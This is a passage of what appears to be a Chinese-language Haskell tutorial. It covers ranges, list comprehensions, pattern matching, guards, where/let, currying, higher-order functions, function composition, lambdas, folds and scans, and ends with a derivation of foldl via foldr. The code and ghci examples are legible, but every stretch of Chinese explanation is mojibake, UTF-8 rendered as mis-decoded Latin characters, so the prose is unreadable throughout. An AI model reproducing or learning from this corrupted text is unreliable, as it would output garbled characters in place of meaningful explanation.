aï¼šè¿”å›åˆ—è¡¨ä¸­çš„æœ€å°å€¼ sum :: (Foldable t, Num a) =&gt; t a -&gt; aï¼šè¿”å›åˆ—è¡¨ä¸­æ‰€æœ‰å…ƒç´ çš„å’Œ product :: (Foldable t, Num a) =&gt; t a -&gt; aï¼šè¿”å›åˆ—è¡¨ä¸­æ‰€æœ‰å…ƒç´ çš„ç§¯ elem :: (Foldable t, Eq a) =&gt; t a -&gt; Boolï¼šåˆ¤æ–­å€¼næ˜¯å¦åœ¨åˆ—è¡¨aä¸­( 123elem n a-- æˆ–n `elem` a --ç”¨``åŒ…ä¸Šå¯ä»¥å˜æˆä¸­ç¼€å‡½æ•°ä½¿ç”¨ Texas rangesä½¿ç”¨..å¯ä»¥è¡¨ç¤ºå‡ºèŒƒå›´å¹¶è‡ªåŠ¨æ¨å¯¼ï¼š 123456789101112ghci&gt; [1 .. 10] [1,2,3,4,5,6,7,8,9,10] ghci&gt; ['a' .. 'z'] &quot;abcdefghijklmnopqrstuvwxyz&quot; ghci&gt; ['K' .. 'Z'] &quot;KLMNOPQRSTUVWXYZ&quot; ghci&gt; [2, 4 .. 20] [2,4,6,8,10,12,14,16,18,20] ghci&gt; [3, 6 .. 20] [3,6,9,12,15,18]ghci&gt; [5, 4 .. 1][5,4,3,2,1] ä¹Ÿå¯ä»¥ç”¨æ¥ç”Ÿæˆæ— ç©·åˆ—è¡¨ï¼Œå¦‚[1..]ã€[1, 3..]ã€‚åŒæ—¶ä¹Ÿæœ‰å‡½æ•°å¯ä»¥ç”Ÿæˆæ— ç©·åˆ—è¡¨ï¼š cycle :: [a] -&gt; [a]ï¼šå°†åŸåˆ—è¡¨ä¸æ–­å¾ªç¯ç”Ÿæˆæ— ç©·åˆ—è¡¨ repeat :: a -&gt; [a]ï¼šå°†ä¼ å…¥çš„å€¼ä¸æ–­é‡å¤ç”Ÿæˆæ— ç©·åˆ—è¡¨ replicate :: Int -&gt; a -&gt; [a]ï¼šå°†å€¼aé‡å¤næ¬¡ï¼Œè¿”å›ç”Ÿæˆçš„åˆ—è¡¨(replicate n a) List comprehensionHaskellä¸­ä¹Ÿæœ‰åˆ—è¡¨æ¨å¯¼ï¼Œå½¢å¼æ˜¯ä¸€ä¸ªä¸­æ‹¬å·ï¼Œå·¦ä¾§ä¸ºè¡¨è¾¾å¼ï¼Œå³ä¾§ä¸ºå˜é‡çš„èŒƒå›´å’Œçº¦æŸæ¡ä»¶ 12345678ghci&gt; [x * 2 | x &lt;- [1 .. 10]] [2,4,6,8,10,12,14,16,18,20] ghci&gt; [x * 2 | x &lt;- [1 .. 10], x * 2 &gt;= 12] [12,14,16,18,20]ghci&gt; [ x | x &lt;- [50 .. 100], x `mod` 7 == 3] [52,59,66,73,80,87,94] ghci&gt; [x * y | x &lt;- [2, 5, 10], y &lt;- [8, 10, 11]] [16,20,22,40,50,55,80,100,110] TupleHaskellä¸­çš„å…ƒç»„å¯ä»¥æœ‰ä¸åŒé•¿åº¦ï¼Œå…ƒç´ å¯ä»¥æœ‰ä¸åŒç±»å‹ã€‚å¹¶ä¸”ä¸€ä¸ªå…ƒç»„çš„ç±»å‹ç”±å…¶ä¸­æ‰€æœ‰å…ƒç´ çš„ç±»å‹å…±åŒå†³å®šã€‚å®ƒçš„å¸¸ç”¨å‡½æ•°ï¼š fst :: (a, b) -&gt; aï¼šè¿”å›å«æœ‰ä¸¤ä¸ªå…ƒç´ å…ƒç»„ä¸­çš„ç¬¬ä¸€ä¸ªå…ƒç´  snd :: (a, b) -&gt; bï¼šè¿”å›å«æœ‰ä¸¤ä¸ªå…ƒç´ å…ƒç»„ä¸­çš„ç¬¬äºŒä¸ªå…ƒç´  zip :: [a] -&gt; [b] -&gt; [(a, b)]ï¼šæ¥æ”¶ä¸¤ä¸ªåˆ—è¡¨ï¼Œè¿”å›ä¸€ä¸ªåˆ—è¡¨ï¼Œæ¯ä¸ªå…ƒç´ æ˜¯ä¾æ¬¡å°†ä¸¤ä¸ªåˆ—è¡¨ä¸­å…ƒç´ é…å¯¹æˆçš„äºŒå…ƒç»„ Syntax in Functionså‡½æ•°å¯ä»¥ç›´æ¥å®šä¹‰ï¼š 1plus x y = x + y è¿™æ—¶Haskellä¼šè‡ªåŠ¨æ¨æ–­å‡½æ•°çš„ç±»å‹ä¸º(Num a) =&gt; a -&gt; a -&gt; aã€‚ä½†æ˜¯æœ€å¥½åœ¨å®šä¹‰å‡½æ•°å‰å£°æ˜å‡½æ•°çš„ç±»å‹ï¼š 12plus :: (Num a) =&gt; a -&gt; a -&gt; aplus x y = x + y Pattern matchingå®šä¹‰å‡½æ•°æ—¶å¯ä»¥ä½¿ç”¨æ¨¡å¼åŒ¹é…è¯­æ³•ã€‚è¿è¡Œæ—¶ä¾æ¬¡å°†è¾“å…¥ä¸ç»™å‡ºçš„æ¨¡å¼ç›¸åŒ¹é…ï¼Œå¦‚æœåŒ¹é…ï¼Œå°±æ‰§è¡Œå¯¹åº”æ“ä½œï¼›ä¸åŒ¹é…ï¼Œå°±ç»§ç»­ä¸ä¸‹ä¸€ä¸ªæ¨¡å¼ç›¸åŒ¹é…ï¼Œç›´åˆ°åŒ¹é…æˆåŠŸï¼Œä¹Ÿå› æ­¤ï¼Œæœ€åå¿…é¡»è¦ç»™å‡ºä¸€ç§é€šç”¨çš„åŒ¹é…æ¥æ¥æ”¶ä¸ç»™å‡ºæ¨¡å¼å…¨ä¸åŒ¹é…çš„è¾“å…¥ã€‚å¦‚ï¼š 123factorial :: (Integral a) =&gt; a -&gt; a factorial 0 = 1 factorial n = n * factorial (n - 1) 12345678first :: (a, b, c) -&gt; a first (x, _, _) = x second :: (a, b, c) -&gt; b second (_, y, _) = y third :: (a, b, c) -&gt; c third (_, _, z) = z å…¶ä¸­_è¡¨ç¤ºä»»ä½•å€¼ï¼Œä¸”ä¸å…³å¿ƒå®ƒçš„å†…å®¹ï¼Œåªæ˜¯ç”¨æ¥å ä½ åˆ—è¡¨çš„(:)æ“ä½œä¹Ÿå¯ä»¥ç”¨æ¥è¿›è¡Œæ¨¡å¼åŒ¹é…ï¼š 1234567head' :: [a] -&gt; a head' [] = error &quot;Can't call head on an empty list, dummy!&quot; head' (x:_) = xsum' :: (Num a) =&gt; [a] -&gt; a sum' [] = 0 sum' (x:xs) = x + sum' xs ä½†(++)æ“ä½œä¸å¯ä»¥ç”¨æ¥æ¨¡å¼åŒ¹é… åœ¨é’ˆå¯¹åˆ—è¡¨è¿›è¡Œæ¨¡å¼åŒ¹é…æ—¶ï¼Œå¦‚æœåŒæ—¶éœ€è¦æ•´ä¸ªåˆ—è¡¨ã€åˆ—è¡¨çš„ç¬¬ä¸€ä¸ªå€¼ã€åˆ—è¡¨é™¤ç¬¬ä¸€ä¸ªå€¼å¤–çš„å†…å®¹ï¼Œå¯ä»¥ä½¿ç”¨xs@(q:qs)ã€‚æ¯”å¦‚[1, 2, 3]é€šè¿‡xs@(q:qs)åŒ¹é…åï¼Œxsä¸º[1, 2, 3]ï¼Œqä¸º1ï¼Œqsä¸º[2, 3] Guard syntaxåœ¨å‡½æ•°çš„å®šä¹‰ä¸­ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨å®ˆå«ï¼ˆguardï¼‰è¯­æ³•ï¼š 1234max' :: (Ord a) =&gt; a -&gt; a -&gt; a max' a b | a &gt; b = a | otherwise = b å…ˆç»™å‡ºä¼ å…¥çš„å‚æ•°å˜é‡ï¼Œç„¶åä¸‹ä¸€è¡Œç¼©è¿›ååŠ |ï¼Œ|åé¢ç­‰å·å‰è¡¨ç¤ºè¿›è¡Œçš„åˆ¤æ–­ï¼Œå¦‚æœä¸ºTrueåˆ™è¿”å›è¿™ä¸ªç­‰å·åé¢çš„å€¼ï¼›å¦‚æœä¸ºFalseåˆ™ç»§ç»­åˆ¤æ–­ä¸‹ä¸€è¡Œï¼Œç›´åˆ°otherwise Case expressionsåœ¨å‡½æ•°çš„å®šä¹‰ä¸­ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨caseè¡¨è¾¾å¼æ¥é…åˆæ¨¡å¼åŒ¹é…ä½¿ç”¨ï¼š 123case expression of pattern -&gt; result pattern -&gt; result ... ä¾‹å¦‚ï¼š 1234567head' :: [a] -&gt; a head' [] = error &quot;No head for empty lists!&quot; head' (x:_) = x -- ç­‰ä»·äºï¼šhead' :: [a] -&gt; a head' xs = case xs of [] -&gt; error &quot;No head for empty lists!&quot; (x:_) -&gt; x 12345678910describeList :: [a] -&gt; String describeList xs = &quot;The list is &quot; ++ case xs of [] -&gt; &quot;empty.&quot; [x] -&gt; &quot;a singleton list.&quot; xs -&gt; &quot;a longer list.&quot; -- ç­‰ä»·äºï¼šdescribeList :: [a] -&gt; String describeList xs = &quot;The list is &quot; ++ what xs where what [] = &quot;empty.&quot; what [x] = &quot;a singleton list.&quot; what xs = &quot;a longer list.&quot; whereå£°æ˜åœ¨å‡½æ•°å®šä¹‰ä¸­è¦ä½¿ç”¨çš„å±€éƒ¨å˜é‡ï¼Œå¯ä»¥ä½¿ç”¨whereå…³é”®å­—ï¼š 1234initials :: String -&gt; String -&gt; String initials firstname lastname = [f] ++ &quot;. &quot; ++ [l] ++ &quot;.&quot; where (f:_) = firstname (l:_) = lastname åœ¨whereä¸­ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨ä¸Šé¢çš„æ¨¡å¼åŒ¹é… letlet &lt;bindings&gt; in &lt;expression&gt;è¯­æ³•å¯ä»¥åœ¨å‡½æ•°çš„å®šä¹‰ä¸­ä½¿ç”¨ï¼Œä¹Ÿå¯ä»¥åœ¨æ™®é€šç®—å¼æˆ–åˆ—è¡¨ä¸­ä½¿ç”¨ï¼š 12345cylinder :: (RealFloat a) =&gt; a -&gt; a -&gt; a cylinder r h = let sideArea = 2 * pi * r * h topArea = pi * r ^2 in sideArea + 2 * topArea 1234ghci&gt; 4 * (let a = 9 in a + 1) + 2 42 ghci&gt; [let square x = x * x in (square 5, square 3, square 2)] [(25,9,4)] if statementHaskellä¸­çš„ifè¯­å¥ä¸ºï¼š 1234567if ... then ...else ...-- or if ... then ... else ...-- orif ... then ...else if ... then ...else ... å…¶ä¸­æœ€åä¸€ä¸ªelseæ— è®ºå¦‚ä½•ä¹Ÿä¸å¯ä»¥çœå» Higher Order FunctionsCurryingHaskellä¸­çš„å‡½æ•°æ˜¯æŸ¯é‡ŒåŒ–ï¼ˆCurryingï¼‰çš„ï¼Œå¯ä»¥çœ‹ä½œæ‰€æœ‰å‡½æ•°éƒ½åªæ¥æ”¶ä¸€ä¸ªå‚æ•°ï¼Œè€Œæ¥æ”¶ä¸¤ä¸ªå‚æ•°çš„å‡½æ•°å®é™…ä¸Šæ˜¯è¿™ä¸ªå‡½æ•°æ¥æ”¶äº†ç¬¬ä¸€ä¸ªå‚æ•°åè¿”å›äº†ä¸€ä¸ªæ¥æ”¶ç¬¬äºŒä¸ªå‚æ•°çš„å‡½æ•°ï¼Œç„¶åç”¨è¿™ä¸ªå‡½æ•°æ¥æ”¶ç¬¬äºŒä¸ªå‚æ•°ï¼Œè¿”å›æœ€ç»ˆçš„ç»“æœã€‚æ¯”å¦‚maxå‡½æ•°ï¼Œå®ƒçš„ç±»å‹ç­¾åæ˜¯ï¼š max :: Ord a => a -> a -> a å¯ä»¥çœ‹æˆa -&gt; (a -&gt; a)ï¼Œå³æ¥æ”¶ä¸€ä¸ªå‚æ•°ï¼Œè¿”å›ä¸€ä¸ªç±»å‹ä¸ºa -&gt; açš„å‡½æ•°ã€‚æ¯”å¦‚max 1çš„ç±»å‹ç­¾åæ˜¯ï¼š max 1 :: (Ord a, Num a) => a -> a å› æ­¤max 1 2ï¼Œä¹Ÿå°±ç­‰åŒäº(max 1) 2ï¼Œå³å°†å‡½æ•°max 1åº”ç”¨åœ¨æ•°å­—2ä¸Š åŒæ—¶ï¼Œå‡½æ•°ä¹Ÿå¯ä»¥æ¥æ”¶å‡½æ•°ä½œä¸ºå‚æ•°ï¼Œå‚æ•°æœ‰å‡½æ•°çš„å‡½æ•°å°±è¢«ç§°ä¸ºé«˜é˜¶å‡½æ•°ï¼ˆHigher Order Functionsï¼‰ ä¸€äº›é«˜é˜¶å‡½æ•°zipWithzipWith :: (a -> b -> c) -> [a] -> [b] -> [c] ç¬¬ä¸€ä¸ªå‚æ•°ä¸ºä¸€ä¸ªå‡½æ•°ï¼Œç„¶åæ¥æ”¶ä¸¤ä¸ªåˆ—è¡¨ï¼Œå°†å…¶å¯¹åº”å…ƒç´ ä¼ å…¥æ¥æ”¶çš„å‡½æ•°ä¸­ï¼Œå¾—åˆ°çš„ç»“æœç»„æˆä¸€ä¸ªæ–°çš„åˆ—è¡¨ã€‚å¦‚æœä¸¤ä¸ªä¼ å…¥çš„åˆ—è¡¨é•¿åº¦ä¸åŒï¼Œä»¥æœ€çŸ­çš„åˆ—è¡¨ä¸ºå‡†ï¼Œé•¿åˆ—è¡¨ä¸­è¶…å‡ºçš„å…ƒç´ çœç•¥ã€‚ç”¨ä¾‹ï¼š 1234ghci&gt; zipWith (+) [4,2,5,6] [2,6,2,3] [6,8,7,9] ghci&gt; zipWith max [6,3,2,1] [7,3,1,5] [7,3,2,5] flipflip :: (a -> b -> c) -> b -> a -> c flipå‡½æ•°æ¥æ”¶ä¸€ä¸ªäºŒå…ƒå‡½æ•°ï¼Œè¿”å›ä¸€ä¸ªæ–°çš„äºŒå…ƒå‡½æ•°ï¼Œå°†å…¶è¾“å…¥çš„ä¸¤ä¸ªå‚æ•°é¡ºåºåè¿‡æ¥ï¼š 1234ghci&gt; zip [1,2,3,4,5] &quot;hello&quot;[(1,'h'),(2,'e'),(3,'l'),(4,'l'),(5,'o')]ghci&gt; flip zip [1,2,3,4,5] &quot;hello&quot; [('h',1),('e',2),('l',3),('l',4),('o',5)] mapmap :: (a -> b) -> [a] -> [b] mapå‡½æ•°æ¥æ”¶ä¸€ä¸ªå‡½æ•°få’Œä¸€ä¸ªåˆ—è¡¨aï¼Œå°†å‡½æ•°fåº”ç”¨åœ¨åˆ—è¡¨açš„æ¯ä¸ªå…ƒç´ ä¸­ï¼Œå¹¶è¿”å›å¾—åˆ°çš„æ‰€æœ‰ç»“æœç»„æˆçš„åˆ—è¡¨bï¼š 12ghci&gt; map (+3) [1,5,3,1,6] [4,8,6,4,9] filterfilter :: (a -> Bool) -> [a] -> [a] filterå‡½æ•°æ¥æ”¶ä¸€ä¸ªå‡½æ•°få’Œä¸€ä¸ªåˆ—è¡¨aï¼Œå°†åˆ—è¡¨aä¸­çš„æ¯ä¸ªå…ƒç´ ä¼ å…¥å‡½æ•°fä¸­ï¼Œå¦‚æœç»“æœä¸ºTrueå°±ä¿ç•™ï¼Œç»“æœä¸ºFalseå°±æŠ›å¼ƒï¼Œè¿”å›æ‰€æœ‰ä¿ç•™çš„å…ƒç´ ç»„æˆçš„æ–°åˆ—è¡¨ï¼š 12ghci&gt; filter even [1..10] [2,4,6,8,10] takeWhiletakeWhile :: (a -> Bool) -> [a] -> [a] takeWhileå‡½æ•°æ¥æ”¶ä¸€ä¸ªå‡½æ•°få’Œä¸€ä¸ªåˆ—è¡¨aï¼Œå°†åˆ—è¡¨aä¸­ä»å·¦å‘å³æ¯ä¸ªå…ƒç´ ä¼ å…¥å‡½æ•°fï¼Œç›´åˆ°ç»“æœä¸ºFalseåœæ­¢ï¼Œè¿”å›åœæ­¢å‰ä¼ å…¥çš„æ‰€æœ‰å…ƒç´ ç»„æˆçš„æ–°åˆ—è¡¨ï¼š 12ghci&gt; takeWhile (/=' ') &quot;word1 word2&quot;&quot;word1&quot; Function applicationå‡½æ•°åº”ç”¨å¯ä»¥ä½¿ç”¨$ï¼Œ$æ˜¯ä¸€ä¸ªå‡½æ•°ï¼Œå®ƒçš„ç±»å‹æ˜¯ï¼š ($) :: (a -> b) -> a -> b å®ƒå¯ä»¥æ”¹å˜å‡½æ•°ç»“åˆä¼˜å…ˆçº§ï¼Œå°†å·¦ä¾§å‡½æ•°åº”ç”¨äºå…¨éƒ¨å³ä¾§å†…å®¹ä¸Šï¼Œç›¸å½“äºç»™å³ä¾§æ•´ä½“åŠ ä¸Šäº†æ‹¬å·ã€‚å¦åˆ™å‡½æ•°é»˜è®¤å·¦ç»“åˆï¼Œä¼šä¾æ¬¡å‘å³åº”ç”¨è€Œä¸ä¼šåº”ç”¨åœ¨æ•´ä½“ä¸Šã€‚ 1234567f $ g x-- ç­‰ä»·äºf (g x)-----f g x-- ç­‰ä»·äº(f g) x Function Compositionå‡½æ•°å¤åˆå¯ä»¥ä½¿ç”¨.ï¼Œ.ä¹Ÿæ˜¯ä¸€ä¸ªå‡½æ•°ï¼Œå®ƒçš„ç±»å‹æ˜¯ï¼š (.) :: (b -> c) -> (a -> b) -> a -> c å®šä¹‰æ˜¯ï¼š f . g = \\x -> f (g x) ä½†æ˜¯å‡½æ•°å¤åˆçš„ä¼˜å…ˆçº§è¦æ¯”å‡½æ•°æ‰§è¡Œä½ï¼Œæ¯”å¦‚ï¼š 1sum . replicate 5 . max 6.7 8.9 ä¼šå…ˆæ‰§è¡Œmax 6.7 8.9å¹¶è¿”å›8.9ï¼Œç„¶åå°†sumã€replicate 5ã€8.9å¤åˆï¼Œä½†ä¸¤ä¸ªå‡½æ•°æ— æ³•å’Œä¸€ä¸ªå€¼(8.9)å¤åˆï¼Œæ‰€ä»¥ä¼šæŠ›å‡ºå¼‚å¸¸ã€‚å› æ­¤è¦ä½¿ç”¨$æ¥è§„å®šå…ˆå¤åˆå†æ‰§è¡Œï¼š 1sum . replicate 5 . max 6.7 $ 8.9 lambdaHaskellè¯­è¨€ä¸­çš„lambdaè¡¨è¾¾å¼æ˜¯ç”¨\\æ¥è¡¨ç¤ºçš„ï¼ˆå› ä¸ºçœ‹ç€åƒ$\\mathtt{\\lambda}$ï¼Ÿï¼‰å…·ä½“è¯­æ³•æ˜¯ 1\\para1 para2 ... -&gt; return â€œ-&gt;â€å‰çš„ para1 para2 â€¦ æ˜¯ä¼ å…¥å‚æ•°ï¼Œå•ä¸ªå¤šä¸ªéƒ½å¯ä»¥ï¼Œéœ€è¦ç”¨ç©ºæ ¼éš”å¼€ï¼›â€-&gt;â€åçš„ return æ˜¯è®¡ç®—å¾—åˆ°çš„è¿”å›å€¼ã€‚ä¸€èˆ¬éœ€è¦ç”¨æ‹¬å·å°†æ•´ä¸ªè¡¨è¾¾å¼æ‹¬èµ·æ¥ï¼Œé˜²æ­¢è¿”å›å€¼éƒ¨åˆ†ä¸€ç›´å‘å³å»¶ä¼¸ã€‚ foldå’Œscanfoldå’Œscanéƒ½æ¥æ”¶ä¸‰ä¸ªå‚æ•°ï¼ˆä¸€ä¸ªäºŒå…ƒå‡½æ•°ï¼Œä¸€ä¸ªåˆå§‹å€¼accumulatorï¼Œä¸€ä¸ªè¦æŠ˜å çš„åˆ—è¡¨ï¼‰ï¼Œfoldè¿”å›ä¸€ä¸ªå€¼ï¼Œè€Œscanè¿”å›ä¸€ä¸ªåˆ—è¡¨ä¼ å…¥çš„äºŒå…ƒå‡½æ•°f :: a -&gt; b -&gt; bå°†accumulatorå’Œä»åˆ—è¡¨ä¸­å–å‡ºçš„å€¼ä¸€åŒä¼ å…¥ï¼ˆlåˆ™accumulatoråœ¨å·¦è¾¹ä¸ºç¬¬ä¸€ä¸ªå‚æ•°ï¼Œråˆ™accumulatoråœ¨å³è¾¹ä¸ºç¬¬äºŒä¸ªå‚æ•°ï¼‰ foldlå·¦æŠ˜å ï¼Œæ¯æ¬¡ä»åˆ—è¡¨æœ€å·¦ä¾§å–å‡ºä¸€ä¸ªå€¼ï¼Œå’Œaccumulatorä¸€èµ·ä¼ å…¥äºŒå…ƒå‡½æ•°ï¼Œå¹¶ä¸”accumulatoråœ¨å·¦è¾¹ä¸ºç¬¬ä¸€ä¸ªå‚æ•°ï¼Œå¦‚ï¼š 1foldl f a xs å®ƒçš„ç»“æœè®¡ç®—è¿‡ç¨‹ä¸º 1234&gt; foldl f a [x1, x2, x3][1.] a = f a x1[2.] a = f a x2 = f (f a x1) x2[3.] a = f a x3 = f (f (f a x1) x2) x3 å¯ä»¥çœ‹å‡º f (f a x1) x2 å…¶å®å°±æ˜¯ foldl f a [x1, x2]è€Œä¸”å› æ­¤ï¼Œfoldlåœ¨è®¡ç®—æ—¶æœ€å¤–å±‚éœ€è¦æ‰¾åˆ°x3ï¼Œè¿™æ ·å¦‚æœxsæ˜¯ä¸€ä¸ªæ— ç©·åˆ—è¡¨ï¼Œé‚£ä¹ˆå°†æ— æ³•è®¡ç®—ï¼Œé™·å…¥æ— ç©·ã€‚æ‰€ä»¥foldlè™½ç„¶çœ‹èµ·æ¥ä»å·¦è¾¹å–å€¼ï¼Œä½†æ˜¯å‡½æ•°éœ€è¦ä»å³ä¾§å±•å¼€ï¼Œå¹¶ä¸é€‚ç”¨äºæ— ç©·åˆ—è¡¨ foldrå³æŠ˜å ï¼Œæ¯æ¬¡ä»åˆ—è¡¨æœ€å³ä¾§å–å‡ºä¸€ä¸ªå€¼ï¼Œå’Œaccumulatorä¸€èµ·ä¼ å…¥äºŒå…ƒå‡½æ•°ï¼Œå¹¶ä¸”accumulatoråœ¨å³è¾¹ä¸ºç¬¬äºŒä¸ªå‚æ•°ï¼Œå¦‚ï¼š 1foldr f a xs å®ƒçš„ç»“æœè®¡ç®—è¿‡ç¨‹ä¸º 1234&gt; foldr f a [x1, x2, x3][1.] a = f x3 a[2.] a = f x2 a = f x2 (f x3 a)[3.] a = f x1 a = f x1 (f x2 (f x3 a)) ä»ä¸­å¯ä»¥çœ‹å‡º f x2 (f x3 a) å°±æ˜¯ foldr f a [x2, x3]å› æ­¤å¯ä»¥ä½¿ç”¨é€’å½’æ¥å†™ä¸€ä¸ªå’Œfoldræ•ˆæœä¸€æ ·çš„å‡½æ•°: 123foldr' :: (a -&gt; b -&gt; b) -&gt; b -&gt; [a] -&gt; bfoldr' _ x [] = xfoldr' f a (x:xs) = f x (foldr' f a xs) ä¹Ÿå¯ä»¥çœ‹å‡ºï¼Œæœ€å¤–å±‚è®¡ç®—æ—¶åªéœ€è¦x1å¹¶ä¸”å‘ä¸‹é€’å½’ï¼Œå¹¶ä¸ä¼šæ¥è§¦åˆ°åˆ—è¡¨æœ«å°¾ï¼Œå› æ­¤å¯ä»¥ç”¨äºæ— ç©·åˆ—è¡¨ã€‚foldrå³ä½¿çœ‹ä¸Šå»ä»å³è¾¹å–å€¼ï¼Œä½†æ˜¯è¦ä»å·¦å¼€å§‹å±•å¼€ï¼Œå¯ä»¥ç”¨äºæ— ç©·åˆ—è¡¨ ä¾‹å¦‚ï¼š 12345ghci&gt; foldr (||) False (repeat True)True -- ç”±äºé€»è¾‘è¿ç®—å­˜åœ¨çŸ­è·¯ï¼Œè®¡ç®—å€¼å…¨åº”ä¸ºTrueï¼Œæ‰€ä»¥ç›´æ¥è¿”å›äº†ghci&gt; foldl (||) False (repeat True)-- è¿™é‡Œä»€ä¹ˆéƒ½ä¸ä¼šå‘ç”Ÿï¼Œç›´åˆ°ç”µè„‘å†…å­˜è¢«çˆ†æ‰-- å› ä¸ºå‡½æ•°åˆšå¼€å§‹å°±éœ€è¦åˆ—è¡¨æœ€å³ä¾§çš„å€¼ï¼Œæ‰€ä»¥åœ¨ä¸æ–­è®¡ç®—è¿™ä¸ªæ— ç©·åˆ—è¡¨ scanlå’Œscanrscanç±»ä¼¼foldï¼Œåªæ˜¯å°†ä¸­é—´å¾—åˆ°çš„æ¯ä¸€ä¸ªå€¼éƒ½æ·»åŠ è¿›ä¸€ä¸ªåˆ—è¡¨ä¸­å¹¶è¿”å›è¿™ä¸ªåˆ—è¡¨scanlåˆ™å‘å³å»¶ä¼¸è¿™ä¸ªåˆ—è¡¨ï¼Œscanråˆ™å‘å·¦å»¶ä¼¸è¿™ä¸ªåˆ—è¡¨ä½†æ˜¯å®ƒå’Œfoldæ°æ°ç›¸åï¼Œscanlèƒ½ç”¨äºæ— ç©·åˆ—è¡¨ï¼Œè€Œscanrä¸èƒ½ 12345&gt; scanr f a [x1, x2, x3][1.] æœ€å³ä¾§å…ƒç´ (-1 in python) : a[2.] å³ä¾§ç¬¬äºŒä¸ªå…ƒç´ (-2) : f x3 a[3.] å³ä¾§ç¬¬ä¸‰ä¸ªå…ƒç´ (-3) : f x2 (f x3 a)[4.] å³ä¾§ç¬¬å››ä¸ªå…ƒç´ (-4) : f x1 (f x2 (f x3 a)) å¯ä»¥çœ‹å‡º f x2 (f x3 a) æ˜¯ foldr f a [x2, x3]ï¼Œä¹Ÿæ˜¯ scanr f a [x2, x3] çš„ç¬¬ä¸€ä¸ªå…ƒç´ å› æ­¤å¯ä»¥ç”¨é€’å½’æ¥å†™ä¸€ä¸ªå’Œscanræ•ˆæœä¸€æ ·çš„å‡½æ•°ï¼š 12345scanr' :: (a -&gt; b -&gt; b) -&gt; b -&gt; [a] -&gt; [b]scanr' _ x [] = [x]-- scanr' f a (x:xs) = f x (foldr f a xs) : scanr' f a xsscanr' f a (x:xs) = f x q : qs where qs@(q:_) = scanr' f a xs scanlä¹Ÿæ˜¯åŒç†ï¼š 123scanl' :: (b -&gt; a -&gt; b) -&gt; b -&gt; [a] -&gt; [b]scanl' _ x [] = [x]scanl' f a (x:xs) = a : scanl' f (f a x) xs ä¹Ÿå¯ä»¥çœ‹å‡ºï¼Œscanrè¿”å›çš„åˆ—è¡¨çš„ç¬¬ä¸€ä¸ªå…ƒç´ æ˜¯æœ€åæ·»åŠ è¿›å»çš„ï¼Œæ‰€ä»¥å®ƒæ— æ³•ç”¨äºæ— ç©·åˆ—è¡¨ã€‚è€Œscanlè¿”å›çš„åˆ—è¡¨ä¸­çš„å…ƒç´ æ˜¯ä»å·¦åˆ°å³ä¾æ¬¡æ·»åŠ ï¼Œå¯ä»¥ç”¨äºæ— ç©·åˆ—è¡¨æˆªå–å‰ä¸€éƒ¨åˆ†ç»“æœï¼š 1234ghci&gt; take 10 (scanl (+) 0 [1..])[0,1,3,6,10,15,21,28,36,45]ghci&gt; take 10 (scanr (+) 0 [1..])[*** Exception: stack overflow ä½¿ç”¨foldrç¼–å†™foldlpdcxsè¿˜ç»™æˆ‘ä»‹ç»äº†ä¸€ä¸ªç¥å¥‡çš„æ“ä½œï¼Œç”¨foldlæ¥å®šä¹‰foldrï¼š 1foldl' f z xs = foldr (\\x g y -&gt; g (f y x)) id xs z å®ƒåˆ©ç”¨ foldr (\\x g y -&gt; g (f y x)) id xs ç”Ÿæˆä¸€ä¸ªå‡½æ•°ï¼Œä½œç”¨äºzå¾—åˆ°ç»“æœã€‚ å…ˆæ¥çœ‹ä¸€ä¸‹foldrçš„ç±»å‹ï¼š 12foldr :: Foldable t =&gt; (a -&gt; b -&gt; b) -&gt; b -&gt; t a -&gt; b-- å¯ä»¥çœ‹æˆ (a -&gt; b -&gt; b) -&gt; b -&gt; [a] -&gt; b ä½†æ˜¯åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œç±»å‹bå¹¶ä¸æ˜¯ä¸€ä¸ªæ•°å­—ï¼Œè€Œæ˜¯ä¸€ä¸ªå‡½æ•°(b -&gt; b)ã€‚ æ‰€ä»¥è¿™é‡Œfoldrçš„ç±»å‹å¯ä»¥å†™æˆï¼š (a -> (b -> b) -> (b -> b)) -> (b -> b) -> [a] -> (b -> b) å¯¹åº”äºç”¨æ³• foldr (\\x g y -&gt; g (f y x)) id xs ï¼Œå®ƒè¿”å›çš„å€¼åº”è¯¥æ˜¯ä¸€ä¸ªå‡½æ•°ï¼Œç±»å‹ä¸º b -&gt; bï¼ˆåé¢è¦ä½œç”¨äºzï¼‰è€Œxså¯¹åº”äº[a]ï¼›idå¯¹åº”äº(b -&gt; b)æ‰€ä»¥ (\\x g y -&gt; g (f y x)) è¦å¯¹åº”äºï¼š (a -> (b -> b) -> (b -> b)) å› æ­¤å¯ä»¥æ¨æ–­å‡ºxçš„ç±»å‹æ˜¯aï¼›yçš„ç±»å‹æ˜¯bï¼›è€Œè¿”å›çš„å€¼ä¸ºä¸€ä¸ªç±»å‹ä¸º(b -&gt; b)çš„å‡½æ•°ã€‚ å†çœ‹ï¼Œè¿”å›çš„å€¼æ˜¯ g (f y x) ï¼Œå…¶ä¸­ f y x è¿”å›çš„æ˜¯ä¸€ä¸ªå€¼ï¼Œç±»å‹ä¸ºbæ‰€ä»¥gæ¥æ”¶ä¸€ä¸ªç±»å‹bï¼Œè¿”å›ä¸€ä¸ªç±»å‹b -&gt; bã€‚å³gçš„ç±»å‹ä¸ºï¼š b -> (b -> b) ç°åœ¨æ ¹æ®foldrçš„å®šä¹‰ï¼š foldr f a (x:xs) = f x (foldr f a xs) å¸¦å…¥è®¡ç®—ä¸€ä¸‹ï¼š xså³ä¸º[x1..xn]ï¼Œä¸ºäº†æ–¹ä¾¿ï¼Œç”¨xsâ€™æ¥è¡¨ç¤º[x2..xn]ï¼Œç”¨xsâ€™â€™æ¥è¡¨ç¤º[x3..xn] å®šä¹‰ä¸­çš„få³ä¸º(\\x g y -&gt; g (f y x))ï¼Œaå³ä¸ºid 12 foldr (\\x g y -&gt; g (f y x)) id xs z= (\\x g y -&gt; g (f y x)) x1 (foldr (...) id xs') z å†™å®Œç¬¬ä¸€æ­¥ï¼Œå¯ä»¥å‘ç°ï¼Œx1 (foldr (â€¦) id xsâ€™) z æ­£å¥½åˆ†åˆ«å¯¹åº”äº†lambdaè¡¨è¾¾å¼ä¸­çš„xã€gã€yã€‚å¯ä»¥å°†å…¶åº”ç”¨ï¼Œè¿›ä¸€æ­¥å±•å¼€ï¼š 12 (\\x g y -&gt; g (f y x)) x1 (foldr (...) id xs') z= (foldr (...) id xs') (f z x1) 